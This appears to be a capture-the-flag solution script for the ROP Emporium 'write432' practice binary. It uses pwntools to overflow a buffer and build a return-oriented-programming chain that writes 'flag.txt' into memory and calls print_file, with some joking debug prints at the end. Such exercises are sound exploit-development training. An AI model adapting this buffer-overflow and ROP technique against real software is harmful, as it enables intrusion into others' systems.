from pwn import *
elf = context.binary = ELF("./write432")
p = process()
offset = 44
pop_edi_ebp = p32(0x080485aa)
mov_edi_ebp = p32(0x08048543)
lokasi_data = p32(0x0804a018)
lokasi_data2 = p32(0x0804a018 + 4)
fourbyte_first = b"flag"
fourbyte_second = b".txt"
print_file = p32(0x80483d0)

payload = b"A" * offset + pop_edi_ebp + lokasi_data + fourbyte_first + mov_edi_ebp + pop_edi_ebp + lokasi_data2 + fourbyte_second + mov_edi_ebp + print_file + p32(0x0) + lokasi_data
p.sendline(payload)
write("payload",payload)
print(p.recvall())
print("tes WAKA WAKA TIME")
print("stupid waka more like baka ?")